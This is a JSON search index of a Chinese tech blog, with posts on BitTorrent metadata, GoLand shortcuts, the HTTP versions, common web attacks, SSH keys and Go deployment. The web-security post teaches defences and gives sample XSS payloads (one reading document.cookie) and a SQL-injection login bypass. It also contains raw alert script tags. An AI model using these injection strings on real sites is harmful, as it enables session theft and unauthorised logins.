ID为9，port消息，表示端口号为0x83c5 = 33733\n00 00 00 03 14 03 01 --> message ID为20(0x14)，extend消息，编号03为upload_only，表示设置upload_only = 1\n00 00 31 70 14 02 xx --> message ID为20(0x14)，extend消息，编号02为ut_metadata，后面的xx表示[msg_type: 1, piece: 2, total_size: 45377]和相应块的metadata数据\n```\n\n\n看第三个消息可以知道消息长度为0x3170，这个长度包括了[msg_type...]这一串字符串的长度，共0x2f个字节，我们将其减去就得到了piece2的长度：0x3170 - 0x2f = 0x3141 我们上面说过每个块的大小应该是16KB，也就是0x4000，这里的大小为0x3141，只可能是最后一块。我们稍微计算验证下，将整个info的长度45377(0xb141)按16KB分块\n\n```\npiece 0: 0x0001 ~ 0x4000 长度0x4000\npiece 1: 0x4001 ~ 0x8000 长度0x4000\npiece 2: 0x8001 ~ 0xb141 长度0x3141\n```\n\n\n可以看到piece2正是最后一块，大小为0x3141。至此我们得到了第二块的metadata，然后通过request消息获取piece0和piece1获取第一和第二块的metadata，将三块的消息合并成torrent文件info字段，然后再加上create date、create by或comment等信息，种子文件就算完成下载了。<font color=\"red\">可见要在BT网络中完成实际的资源下载，就必须完整获取到种子文件，因为种子文件中不单有infohash值，还有piece sha1校验码，分块下载时需要进行校验，而磁力连接magnet只是一个最小化入口，最终还是需要通过磁力连接在DHT网络中获取种子文件的完整信息</font>\n\n\n\n### 0x5: 校验info_hash\n\n我们将从DHT网络中下载的种子文件和原始的种子文件进行比较，可以看到annouce和annouce-list字段都丢掉了(引入了DHT网络后，BT可以实现Trackerless)，create date发生了变化，info字段不变\n\n磁力链是为了简化BT种子文件的分发，封装了一个简化版的magnet url，客户端解析这个magnet磁力链之后，需要在DHT网络中寻找infohash对应的peer节点，获取节点成功后，向目标peer节点获取真正的BitTorrent种子(.torrent文件)信息(包含了完整的pieces SHA1杂凑信息)，另一个渠道就是传统的Bt种子论坛会分发.BT种子文件\n\n\n\n\n\n# 6. 参考资料\n\n+ https://www.cnblogs.com/LittleHann/p/6180296.html","tags":["dht"],"categories":["BitTorrent"]},{"title":"golang_ide_goland使用","url":"%2Fp%2F5a4d0049.html","content":"\n\n\n### 1. 保存文件自动 go fmt + go imports\n\ngo to preferences ->Tools ->File Watchers and enable go fmt . This way on each save it will format the file.\n\n\ngoland tools->filewatchers->go fmt| go imports\n\n<!-- more -->\n\n\n\n### 2. 快捷命令\n\n删除 cmd + x\n\n复制 cmd + d\n\nCMD + E 呼出最近文件和常用功能\n\nfavorites 可以查看书签/断点/收藏\n\n各种搜索 两次 shift\n\n比较文件 选择两个 cmd+d\n\nctrl + shift + h 搜索\n\ncmd + [] 进入返回\n\n+ 开启标签移动\n\t-  cmd + [] + shift\n\n+ 代码提交比较\n\t- VCS -> Local History | Commit 查看\n\n+ 文件导航 \n\t- cmd + f12 \n\t- cmd + 7\n\n+ 看定义所有的方法 \n\t- cmd + b\n\n+ 通过 interface 查看实现的Struct   \n\t- shift + cmd + b \n\t- ctrl + h 贤淑类型层次  感觉差不多实现功能了\n\n+ super method  查看struct实现了哪些接口, 找爹\n\t- cmd + u\n","tags":["golang"],"categories":["golang"]},{"title":"http的介绍","url":"%2Fp%2Fb03bc449.html","content":"\n# 1. http 介绍\n\n### 1.1 method\n\nHTTP1.0 定义了三种请求方法： GET, POST 和 HEAD方法。\n\nHTTP1.1 新增了六种请求方法：OPTIONS、PUT、PATCH、DELETE、TRACE 和 CONNECT 方法。\n\n<!-- more -->\n\n| 序号 | 方法    | 描述                                                         |\n| :--- | :------ | :----------------------------------------------------------- |\n| 1    | GET     | 请求指定的页面信息，并返回实体主体。                         |\n| 2    | HEAD    | 类似于 GET 请求，只不过返回的响应中没有具体的内容，用于获取报头 |\n| 3    | POST    | 向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST 请求可能会导致新的资源的建立和/或已有资源的修改。 |\n| 4    | PUT     | 从客户端向服务器传送的数据取代指定的文档的内容。             |\n| 5    | DELETE  | 请求服务器删除指定的页面。                                   |\n| 6    | CONNECT | HTTP/1.1 协议中预留给能够将连接改为管道方式的代理服务器。    |\n| 7    | OPTIONS | 允许客户端查看服务器的性能。                                 |\n| 8    | TRACE   | 回显服务器收到的请求，主要用于测试或诊断。                   |\n| 9    | PATCH   | 是对 PUT 方法的补充，用来对已知资源进行局部更新 。           |\n\n### 1.2 状态码\n\n| 状态码 | 状态码英文名称                  | 中文描述                                                     |\n| :----- | :------------------------------ | :----------------------------------------------------------- |\n| 100    | Continue                        | 继续。[客户端](http://www.dreamdu.com/webbuild/client_vs_server/)应继续其请求 |\n| 101    | Switching Protocols             | 切换协议。服务器根据客户端的请求切换协议。只能切换到更高级的协议，例如，切换到HTTP的新版本协议 |\n|        |                                 |                                                              |\n| 200    | OK                              | 请求成功。一般用于GET与POST请求                              |\n| 201    | Created                         | 已创建。成功请求并创建了新的资源                             |\n| 202    | Accepted                        | 已接受。已经接受请求，但未处理完成                           |\n| 203    | Non-Authoritative Information   | 非授权信息。请求成功。但返回的meta信息不在原始的服务器，而是一个副本 |\n| 204    | No Content                      | 无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档 |\n| 205    | Reset Content                   | 重置内容。服务器处理成功，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清除浏览器的表单域 |\n| 206    | Partial Content                 | 部分内容。服务器成功处理了部分GET请求                        |\n|        |                                 |                                                              |\n| 300    | Multiple Choices                | 多种选择。请求的资源可包括多个位置，相应可返回一个资源特征与地址的列表用于用户终端（例如：浏览器）选择 |\n| 301    | Moved Permanently               | 永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替 |\n| 302    | Found                           | 临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI |\n| 303    | See Other                       | 查看其它地址。与301类似。使用GET和POST请求查看               |\n| 304    | Not Modified                    | 未修改。所请求的资源未修改，服务器返回此状态码时，不会返回任何资源。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源 |\n| 305    | Use Proxy                       | 使用代理。所请求的资源必须通过代理访问                       |\n| 306    | Unused                          | 已经被废弃的HTTP状态码                                       |\n| 307    | Temporary Redirect              | 临时重定向。与302类似。使用GET请求重定向                     |\n|        |                                 |                                                              |\n| 400    | Bad Request                     | 客户端请求的语法错误，服务器无法理解                         |\n| 401    | Unauthorized                    | 请求要求用户的身份认证                                       |\n| 402    | Payment Required                | 保留，将来使用                                               |\n| 403    | Forbidden                       | 服务器理解请求客户端的请求，但是拒绝执行此请求               |\n| 404    | Not Found                       | 服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置\"您所请求的资源无法找到\"的个性页面 |\n| 405    | Method Not Allowed              | 客户端请求中的方法被禁止                                     |\n| 406    | Not Acceptable                  | 服务器无法根据客户端请求的内容特性完成请求                   |\n| 407    | Proxy Authentication Required   | 请求要求代理的身份认证，与401类似，但请求者应当使用代理进行授权 |\n| 408    | Request Time-out                | 服务器等待客户端发送的请求时间过长，超时                     |\n| 409    | Conflict                        | 服务器完成客户端的 PUT 请求时可能返回此代码，服务器处理请求时发生了冲突 |\n| 410    | Gone                            | 客户端请求的资源已经不存在。410不同于404，如果资源以前有现在被永久删除了可使用410代码，网站设计人员可通过301代码指定资源的新位置 |\n| 411    | Length Required                 | 服务器无法处理客户端发送的不带Content-Length的请求信息       |\n| 412    | Precondition Failed             | 客户端请求信息的先决条件错误                                 |\n| 413    | Request Entity Too Large        | 由于请求的实体过大，服务器无法处理，因此拒绝请求。为防止客户端的连续请求，服务器可能会关闭连接。如果只是服务器暂时无法处理，则会包含一个Retry-After的响应信息 |\n| 414    | Request-URI Too Large           | 请求的URI过长（URI通常为网址），服务器无法处理               |\n| 415    | Unsupported Media Type          | 服务器无法处理请求附带的媒体格式                             |\n| 416    | Requested range not satisfiable | 客户端请求的范围无效                                         |\n| 417    | Expectation Failed              | 服务器无法满足Expect的请求头信息                             |\n|        |                                 |                                                              |\n| 500    | Internal Server Error           | 服务器内部错误，无法完成请求                                 |\n| 501    | Not Implemented                 | 服务器不支持请求的功能，无法完成请求                         |\n| 502    | Bad Gateway                     | 作为网关或者代理工作的服务器尝试执行请求时，从远程服务器接收到了一个无效的响应 |\n| 503    | Service Unavailable             | 由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中 |\n| 504    | Gateway Time-out                | 充当网关或代理的服务器，未及时从远端服务器获取请求           |\n| 505    | HTTP Version not supported      | 服务器不支持请求的HTTP协议的版本，无法完成处理               |\n\n### 1.3 http 缓存\n\n虽然 HTTP 缓存不是必须的，但重用缓存的资源通常是必要的。然而常见的 HTTP 缓存只能存储 [`GET`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET) 响应，对于其他类型的响应则无能为力。缓存的关键主要包括request method和目标URI（一般只有GET请求才会被缓存）。\n\nHTTP/1.1定义的 [`Cache-Control`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Cache-Control) 头用来区分对缓存机制的支持情况， 请求头和响应头都支持这个属性。通过它提供的不同的值来定义缓存策略。\n\n+ 没有缓存\n\n  缓存中不得存储任何关于客户端请求和服务端响应的内容。每次由客户端发起的请求都会下载完整的响应内容。\n\n  ```html\n  Cache-Control: no-store\n  ```\n\n+ 缓存但重新验证\n\n  每次有请求发出时，缓存会将此请求发到服务器（注：该请求应该会带有与本地缓存相关的验证字段），服务器端会验证请求中所描述的缓存是否过期，若未过期（注：实际就是返回304），则缓存才使用本地缓存副本。\n\n  ```html\n  Cache-Control: no-cache\n  ```\n\n+ 私有和公共缓存\n\n  + \"public\" 指令表示该响应可以被任何中间人（注：比如中间代理、CDN等）缓存。\n\n    若指定了\"public\"，则一些通常不被中间人缓存的页面（比如 带有HTTP验证信息（帐号密码）的页面 或 某些特定状态码的页面），将会被其缓存。\n\n  + \"private\" 则表示该响应是专用于某单个用户的，中间人不能缓存此响应，该响应只能应用于浏览器私有缓存中。\n\n  ```html\n  Cache-Control: private\n  Cache-Control: public\n  ```\n\n+ 过期\n\n  过期机制中，最重要的指令是 \"`max-age=<seconds>`\"，表示资源能够被缓存（保持新鲜）的最大时间。相对[Expires](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Expires)而言，max-age是距离请求发起的时间的秒数。针对应用中那些不会改变的文件，通常可以手动设置一定的时长以保证缓存有效，例如图片、css、js等静态资源。\n\n  ```html\n  Cache-Control: max-age=31536000\n  ```\n\n+ 验证方式\n\n  当使用了 \"`must-revalidate`\" 指令，那就意味着缓存在考虑使用一个陈旧的资源时，必须先验证它的状态，已过期的缓存将不被使用。\n\n  ```html\n  Cache-Control: must-revalidate\n  ```\n\n##### 1.3.1 缓存验证\n\n当向服务端发起缓存校验的请求时，服务端会返回 [`200`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/200) ok表示返回正常的结果或者 [`304`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/304) Not Modified(不返回body)表示浏览器可以使用本地缓存文件。304的响应头也可以同时更新缓存文档的过期时间。\n\n+ ETags\n\n  作为缓存的一种强校验器，[`ETag`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/ETag) 响应头是一个对用户代理(User Agent, 下面简称UA)不透明的值。\n\n  如果资源请求的响应头里含有ETag, 客户端可以在后续的请求的头中带上 [`If-None-Match`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-None-Match) 头来验证缓存。\n\n+ Last-Modified\n\n   响应头可以作为一种弱校验器。说它弱是因为它只能精确到一秒。\n\n  如果响应头里含有这个信息，客户端可以在后续的请求中带上 [`If-Modified-Since`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-Modified-Since) 来验证缓存。\n\n\n\n### 1.4 http持久化连接, 多个请求复用 tcp\n\nHttp 1.1 版的最大变化，就是引入了持久连接（persistent connection），即TCP连接默认不关闭，可以被多个请求复用，不用明确声明`Connection: keep-alive`。\n\n\n\n### 1.5 http管道, 多个请求同时用一个tcp\n\nHttp 1.1 版还引入了管道机制（pipelining），即在同一个TCP连接里面，客户端可以同时发送多个请求。这样就进一步改进了HTTP协议的效率。\n\n举例来说，客户端需要请求两个资源。以前的做法是，在同一个TCP连接里面，先发送A请求，然后等待服务器做出回应，收到后再发出B请求。管道机制则是允许浏览器同时发出A请求和B请求，但是服务器还是按照顺序，先回应A请求，完成后再回应B请求。\n\n注意：这个pipelining仅仅是限于理论场景下，大部分桌面浏览器仍然会选择默认关闭HTTP pipelining！\n\n\n\n# 2. http2\n\n### 2.1 头信息压缩\n\nHTTP 协议不带有状态，每次请求都必须附上所有信息。所以，请求的很多字段都是重复的，比如`Cookie`和`User Agent`，一模一样的内容，每次请求都必须附带，这会浪费很多带宽，也影响速度。\n\nHTTP/2 对这一点做了优化，引入了头信息压缩机制（header compression）。一方面，头信息使用`gzip`或`compress`压缩后再发送；另一方面，客户端和服务器同时维护一张头信息表，所有字段都会存入这个表，生成一个索引号，以后就不发送同样字段了，只发送索引号，这样就提高速度了。\n\n\n\n### 2.2 多路复用\n\nHTTP/2 复用TCP连接，在一个连接里，客户端和浏览器都可以同时发送多个请求或回应，而且不用按照顺序一一对应，这样就避免了\"队头堵塞\"。\n\n举例来说，在一个TCP连接里面，服务器同时收到了A请求和B请求，于是先回应A请求，结果发现处理过程非常耗时，于是就发送A请求已经处理好的部分， 接着回应B请求，完成后，再发送A请求剩下的部分。\n\n这样双向的、实时的通信，就叫做多工（Multiplexing）。\n\n+ 实现原理, 数据流\n+ 缺点, 一个 tcp 丢包\n\n### 2.3 服务器推送\n\nHTTP/2 允许服务器未经请求，主动向客户端发送资源，这叫做服务器推送（server push）。\n\nServer Push不同于Websocket，Server Push一般是指服务器主动向客户端推送数据，这是一种单向的主动推送，而WebSocket是双向的，这两种技术不是竞争关系。\n\nServer Push可以用在服务器主动向客户端推送静态资源，比如浏览器请求index.html时，服务器除了返回网页内容外，还会将index.html页面里面的各种css和js一起推送到浏览器缓存起来，当浏览器分析了网页内容发现静态资源时，不需要再去服务器请求一次，它只需要从缓存里直接拿就可以了。不过现代的网站的静态资源大多都是CDN架构的，静态资源都在第三方服务器，Server Push在这方面作用并不大。\n\n\n\n### 2.4 二进制协议\n\nHTTP/1.1 版的头信息肯定是文本（ASCII编码），数据体可以是文本，也可以是二进制。\n\nHTTP/2 则是一个彻底的二进制协议，头信息和数据体都是二进制，并且统称为\"帧\"（frame）：头信息帧和数据帧。\n\n二进制协议的一个好处是，可以定义额外的帧。HTTP/2 定义了近十种帧，为将来的高级应用打好了基础。如果使用文本实现这种功能，解析数据将会变得非常麻烦，二进制解析则方便得多。\n\n\n\n### 2.5 数据流\n\n因为 HTTP/2 的数据包是不按顺序发送的，同一个连接里面连续的数据包，可能属于不同的回应。因此，必须要对数据包做标记，指出它属于哪个回应。\n\nHTTP/2 将每个请求或回应的所有数据包，称为一个数据流（stream）。每个数据流都有一个独一无二的编号。数据包发送的时候，都必须标记数据流ID，用来区分它属于哪个数据流。另外还规定，客户端发出的数据流，ID一律为奇数，服务器发出的，ID为偶数。\n\n数据流发送到一半的时候，客户端和服务器都可以发送信号（`RST_STREAM`帧），取消这个数据流。1.1版取消数据流的唯一方法，就是关闭TCP连接。这就是说，HTTP/2 可以取消某一次请求，同时保证TCP连接还打开着，可以被其他请求使用。\n\n客户端还可以指定数据流的优先级。优先级越高，服务器就会越早回应。\n\n\n\n# 3. http3\n\nHTTP/2 使用了多路复用，一般来说同一域名下只需要使用一个 TCP 连接。但当这个连接中出现了丢包的情况，那就会导致 HTTP/2 的表现情况反倒不如 HTTP/1 了。\n\n因为在出现丢包的情况下，整个 TCP 都要开始等待重传，也就导致了后面的所有数据都被阻塞了。但是对于 HTTP/1.1 来说，可以开启多个 TCP 连接，出现这种情况反到只会影响其中一个连接，剩余的 TCP 连接还可以正常传输数据。\n\nGoogle 就更起炉灶搞了一个基于 UDP 协议的 QUIC 协议，并且使用在了 HTTP/3 上，HTTP/3 之前名为 HTTP-over-QUIC，从这个名字中我们也可以发现，HTTP/3 最大的改造就是使用了 QUIC。\n\n\n\n# 4. 参考资料\n\n+ https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Caching_FAQ\n+ https://www.ruanyifeng.com/blog/2016/08/http.html\n+ https://zhuanlan.zhihu.com/p/58668946","tags":["http"],"categories":["Web"]},{"title":"常见web安全攻击介绍","url":"%2Fp%2F37ebc6b1.html","content":"\n# 1. XSS (**跨站脚本攻击**,落在脚本)\n\nXSS，即 Cross Site Script，中译是跨站脚本攻击；其原本缩写是 CSS，但为了和层叠样式表(Cascading Style Sheet)有所区分，因而在安全领域叫做 XSS。\n\n<script>alert('xss攻击开始')</script>\n\n<script>alert('1')</script>\n\n<script>alert('2')</script>\n\n<script>alert('3\"')</script>\n\n<!-- more -->\n\nXSS 攻击是指攻击者在网站上注入恶意的客户端代码，通过恶意脚本对客户端网页进行篡改，从而在用户浏览网页时，对用户浏览器进行控制或者获取用户隐私数据的一种攻击方式。\n\n### 1.1 举例\n\n+ 在网页 input 或者 textarea 中输入` <script>alert('xss')</script>`或者其他脚本\n+ 直接使用 URL 参数攻击` https://www.baidu.com?jarttoTest=<script>alert(document.cookie)</script>`\n\n### 1.2 防范\n\n+ HttpOnly 防止劫取 Cookie\n\n+ 用户输入检查\n\n  不要相信用户的任何输入。  对于用户的任何输入要进行检查、过滤和转义。建立可信任的字符和 HTML 标签白名单，对于不在白名单之列的字符或者标签进行过滤或编码。\n\n  在 XSS 防御中，输入检查一般是检查用户输入的数据中是否包含 <，> 等特殊字符，如果存在，则对特殊字符进行过滤或编码，这种方式也称为 XSS Filter。\n\n+ 服务器输出检查\n\n  一般来说，除富文本的输出外，在服务器变量输出到 HTML 页面时，可以使用编码或转义的方式来防御 XSS 攻击。例如利用 sanitize-html 对输出内容进行有规则的过滤之后再输出到页面中。\n  \n  \n\n# 2. CSRF(跨站请求伪造,落在请求)\n\nCSRF，即 Cross Site Request Forgery，中译是跨站请求伪造，是一种劫持受信任用户向服务器发送非预期请求的攻击方式。\n\n通常情况下，CSRF 攻击是攻击者借助受害者的 Cookie 骗取服务器的信任，可以在受害者毫不知情的情况下以受害者名义伪造请求发送给受攻击服务器，从而在并未授权的情况下执行在权限保护之下的操作。\n\n### 2.1 防范\n\n+ 验证码\n\n  CSRF 攻击往往是在用户不知情的情况下构造了网络请求。而验证码会强制用户必须与应用进行交互，才能完成最终请求。因为通常情况下，验证码能够很好地遏制 CSRF 攻击。\n\n+ Referer Check\n\n  根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。通过 Referer Check，可以检查请求是否来自合法的\"源\"。\n\n  Referer Check 不仅能防范 CSRF 攻击，另一个应用场景是 \"防止图片盗链\"。\n\n+ 添加 token 验证\n\n  要抵御 CSRF，关键在于在请求中放入攻击者所不能伪造的信息，并且该信息不存在于 Cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。\n\n  \n\n# 3. SQL 注入\n\nsql注入的原理是将sql代码伪装到输入参数中，传递到服务器解析并执行的一种攻击手法。也就是说，在一些对server端发起的请求参数中植入一些sql代码，server端在执行sql操作时，会拼接对应参数，同时也将一些sql注入攻击的“sql”拼接起来，导致会执行一些预期之外的操作。\n\n### 3.1 举例\n\n```sql\nsql:=\"SELECT * FROM user WHERE username='\"+username+\"' AND password='\"+password+\"'\"\n```\n\n如果用户的输入的用户名如下，密码任意\n\n```sql\nmyuser' or 'foo' = 'foo' --\n```\n\n那么我们的SQL变成了如下所示：\n\n```sql\nSELECT * FROM user WHERE username='myuser' or 'foo' = 'foo' --'' AND password='xxx'\n```\n\n在SQL里面`--`是注释标记，所以查询语句会在此中断。这就让攻击者在不知道任何合法用户名和密码的情况下成功登录了。\n\n### 3.2 防范\n\n+ 严格限制Web应用的数据库的操作权限，给此用户提供仅仅能够满足其工作的最低权限，从而最大限度的减少注入攻击对数据库的危害。\n\n+ 检查输入的数据是否具有所期望的数据格式，严格限制变量的类型，例如使用regexp包进行一些匹配处理，或者使用strconv包对字符串转化成其他基本类型的数据进行判断。\n\n+ 对进入数据库的特殊字符（'\"\\尖括号&*;等）进行转义处理，或编码转换。Go 的`text/template`包里面的`HTMLEscapeString`函数可以对字符串进行转义处理。\n\n+ 所有的查询语句建议使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中，即不要直接拼接SQL语句。例如使用`database/sql`里面的查询函数`Prepare`和`Query`，或者`Exec(query string, args ...interface{})`。\n\n+ 在应用发布之前建议使用专业的SQL注入检测工具进行检测，以及时修补被发现的SQL注入漏洞。网上有很多这方面的开源工具，例如sqlmap、SQLninja等。\n\n+ 避免网站打印出SQL错误信息，比如类型错误、字段不匹配等，把代码里的SQL语句暴露出来，以防止攻击者利用这些错误信息进行SQL注入。\n\n\n\n# 4. DDos 攻击\n\n Distributed Denial of Service，翻译成中文就是分布式拒绝服务。一般来说是指攻击者利用“肉鸡”对目标网站在较短的时间内发起大量请求，大规模消耗目标网站的主机资源，让它无法正常服务。在线游戏、互联网金融等领域是 DDoS 攻击的高发行业。\n\n### 4.1 举例\n\n+ SYN Flood 攻击\n\n  SYN Flood 就是用户向服务器发送报文后突然死机或掉线，那么服务器在发出应答报文后就无法收到客户端的确认报文（第三次握手无法完成），这时服务器端一般会重试并等待一段时间（至少 30s）后再丢弃这个未完成的连接。\n\n  一个用户出现异常导致服务器的一个线程等待一会儿并不是大问题，但恶意攻击者大量模拟（构造源 IP 去发送 SYN 包）这种情况，服务器端为了维护数以万计的半连接而消耗非常多的资源，结果往往是无暇理睬正常客户的请求，甚至崩溃。从正常客户的角度看来，网站失去了响应，无法访问。\n\n+ CC 攻击\n\n  CC 攻击的原理就是借助代理服务器针对目标系统的消耗资源比较大的页面不断发起正常的请求，造成对方服务器资源耗尽，一直到宕机崩溃。因此在发送 CC 攻击前，我们需要寻找加载比较慢，消耗资源比较多的网页。比如：需要查询数据库的页面、读写硬盘的文件等。相比其它的 DDoS 攻击 CC 更有技术含量一些，这种攻击你见不到真实源 IP。见不到特别大的异常流量，但造成服务器无法进行正常连接。\n\n### 4.2 防范\n\n**1、采用高性能的网络设备**\n\n首先需要保证路由器、交换机、硬件防火墙等网络设备的性能，当发生DDoS攻击的时候，用足够性能的机器、容量去承受攻击，充分利用网络设备保护网络资源是十分有效的应对策略。\n\n**2、保证服务器系统的安全**\n\n首先要确保服务器软件没有任何漏洞，防止攻击者入侵。确保服务器采用最新系统，并打上安全补丁。在服务器上删除未使用的服务，关闭未使用的端口。对于服务器上运行的网站，确保其打了最新的补丁，没有安全漏洞。\n\n**3、充足的网络带宽保证**\n\n网络带宽直接决定了能抗受攻击的能力，假若仅仅有10M带宽的话，无论采取什么措施都很难对抗现在的SYNFlood攻击，当前至少要选择100M的共享带宽，最好的当然是挂在1000M的主干上了。但需要注意的是，主机上的网卡是1000M的并不意味着它的网络带宽就是千兆的，若把它接在100M的交换机上，它的实际带宽不会超过100M，再就是接在100M的带宽上也不等于就有了百兆的带宽，因为网络服务商很可能会在交换机上限制实际带宽为10M，这点一定要搞清楚。\n\n**4、把网站做成静态页面或者伪静态**\n\n大量事实证明，把网站尽可能做成静态页面，不仅能大大提高抗攻击能力，而且还给黑客入侵带来不少麻烦，至少到现在为止关于HTML的溢出还没出现。如果非需要动态脚本调用，那就把它弄到另外一台单独主机去，免的遭受攻击时连累主服务器，当然，适当放一些不做数据库调用脚本还是可以的。\n\n**5、增强操作系统的TCP/IP栈**\n\nWindows操作系统本身就具备一定的抵抗DDoS攻击的能力，只是默认状态下没有开启而已，若开启的话可抵挡约10000个SYN攻击包，若没有开启则仅能抵御数百个，具体怎么开启，还需自行去微软官网了解。\n\n**6、HTTP 请求的拦截**\n\nHTTP 请求的特征一般有两种：IP 地址和 User Agent 字段。比如，恶意请求都是从某个 IP 段发出的，那么把这个 IP 段封掉就行。或者，它们的 User Agent 字段有特征(包含某个特定的词语)，那就把带有这个词语的请求拦截。\n\n**7、部署CDN**\n\nCDN 指的是网站的静态内容分发到多个服务器，用户就近访问，提高速度。因此，CDN 也是带宽扩容的一种方法，可以用来防御 DDOS 攻击。\n\n**8、隐藏服务器的真实IP地址**\n\n服务器前端加CDN中转，如果资金充裕的话，可以购买高防的盾机，用于隐藏服务器真实IP，域名解析使用CDN的IP，所有解析的子域名都使用CDN的IP地址。此外，服务器上部署的其他域名也不能使用真实IP解析，全部都使用CDN来解析。\n\n\n\n# 5. 参考资料\n\n+ https://juejin.im/post/5cef3a3bf265da1b8d160052\n+ https://github.com/astaxie/build-web-application-with-golang/blob/master/zh/09.4.md\n+ https://www.hi-linux.com/posts/50873.html","tags":["安全"],"categories":["Web"]},{"title":"ssh_scp免密和服务器建立信任","url":"%2Fp%2Ffe0e5995.html","content":"\n+ 在mac上生成密钥\n\t\n\t生成两个文件`vultr`  `vultr.pub`\n\t\n\t`ssh-keygen -t rsa`   //passphrase可以为空\n\n+ 发送到远程服务器\n\n\t第一种方式: \n\t\n\t`scp ~/.ssh/vultr.pub root@207.246.80.69:/root/.ssh/authorized_keys`\n\t\n\t第二种方式:\n\t\n\t`ssh-copy-id -i ~/.ssh/vultr.pub root@207.246.80.69`\n\n<!-- more -->\n+ 添加到vultr的ssh key里(这一步可以不做)\n\n\t`https://my.vultr.com/sshkeys/`\n\n\t\n\n+ 一键连接到ssh\n\t\n\t命令: `ssh -i ~/.ssh/vultr root@207.246.80.69`\n\n+ scp files\n\n\t命令: `scp -i ~/.ssh/vultr files root@207.246.80.69:/root`\n","tags":["ssh"],"categories":["命令"]},{"title":"linux部署golang的方式","url":"%2Fp%2F8956ebfb.html","content":"\n\n### 通过ssh文件上传到服务器\n\n```\nscp -i /Users/liuwei/.ssh/aws.pem -C -r /Users/liuwei/golang/src/web ubuntu@ec2-54-191-9-26.us-west-2.compute.amazonaws.com:/home/ubuntu\n```\n\naws.pem chmod 400\n\nscp  -C 加一个可能会更快\n\n### 发行部署\n\nGo 语言的应用最后编译之后是一个二进制文件，你只需要 copy 这个应用到服务器上，运行起来就行。beego 由于带有几个静态文件、配置文件、模板文件三个目录，所以用户部署的时候需要同时 copy 这三个目录到相应的部署应用之下，下面以我实际的应用部署为例：\n\n<!-- more -->\n```\n$ mkdir /opt/app/beepkg\n$ cp beepkg /opt/app/beepkg\n$ cp -fr views /opt/app/beepkg\n$ cp -fr static /opt/app/beepkg\n$ cp -fr conf /opt/app/beepkg\n\n```\n这样在 /opt/app/beepkg 目录下面就会显示如下的目录结构：\n\n```\n.\n├── conf\n│   ├── app.conf\n├── static\n│   ├── css\n│   ├── img\n│   └── js\n└── views\n    └── index.tpl\n├── beepkg\n\n```\n这样我们就已经把我们需要的应用搬到服务器了，那么接下来就可以开始部署了。\n\n就是一共上传3个文件夹和1个可执行文件\n\n### 1. 独立部署\n在 linux 下面部署，我们可以利用 nohup 命令，把应用部署在后端，如下所示：\n\n```\nnohup ./beepkg &\n```\n这样你的应用就跑在了 Linux 系统的守护进程\n\n\n\n### 2. supervisord 管理\nsupervisord 是用 Python 实现的一款非常实用的进程管理工具，supervisord 还要求管理的程序是非 daemon 程序，supervisord 会帮你把它转成 daemon 程序，因此如果用 supervisord 来管理 nginx 的话，必须在 nginx 的配置文件里添加一行设置 daemon off 让 nginx 以非 daemon 方式启动。\n\n1. 安装 setuptools\n\n```\nwget http://pypi.python.org/packages/2.7/s/setuptools/setuptools-0.6c11-py2.7.egg\nsh setuptools-0.6c11-py2.7.egg\neasy_install supervisor\necho_supervisord_conf >/etc/supervisord.conf\nmkdir /etc/supervisord.conf.d\n```\n\n2. 修改配置 /etc/supervisord.conf\n\n```\n[include]\nfiles = /etc/supervisord.conf.d/*.conf\n```\n\n3. 新建管理的应用\ncd /etc/supervisord.conf.d\nvim beepkg.conf\n配置文件：\n\n```\n[program:beepkg]\ndirectory = /opt/app/beepkg\ncommand = /opt/app/beepkg/beepkg\nautostart = true\nstartsecs = 5\nuser = root\nredirect_stderr = true\nstdout_logfile = /var/log/supervisord/beepkg.log\n```\n\n##### supervisord 管理\n\nsupervisord 安装完成后有两个可用的命令行 supervisord 和 supervisorctl，命令使用解释如下：\n\n  ● supervisord，初始启动 Supervisord，启动、管理配置中设置的进程。\n\n  ● supervisorctl stop programxxx，停止某一个进程(programxxx)，programxxx 为 [program:beepkg] 里配置的值，这个示例就是 beepkg。\n\n  ● supervisorctl start programxxx，启动某个进程\n\n  ● supervisorctl restart programxxx，重启某个进程\n\n  ● supervisorctl stop groupworker: ，重启所有属于名为 groupworker 这个分组的进程(start,restart 同理)\n\n  ● supervisorctl stop all，停止全部进程，注：start、restart、stop 都不会载入最新的配置文件。\n\n  ● supervisorctl reload，载入最新的配置文件，停止原有进程并按新的配置启动、管理所有进程。\n\n  ● supervisorctl update，根据最新的配置文件，启动新配置或有改动的进程，配置没有改动的进程不会受影响而重启。\n\n注意：显示用 stop 停止掉的进程，用 reload 或者 update 都不会自动重启。\n\n\n> 自己的配置\n\n```\nweb.conf\n\n[program:web]\ndirectory = /home/ubuntu/web\ncommand = /home/ubuntu/web/web\nautostart = true\nstartsecs = 5\nuser = root\nredirect_stderr = true\nstdout_logfile = /var/log/supervisord/web.log\n```\n\nsudo supervisord //启动\nsudo supervisorctl stop web //结束\n\n\n\n### 3. nginx部署\n\n1 安装nginx \n\n```\nsudo apt-get install nginx\n```\n\nUbuntu安装之后的文件结构大致为：\n\n  ● 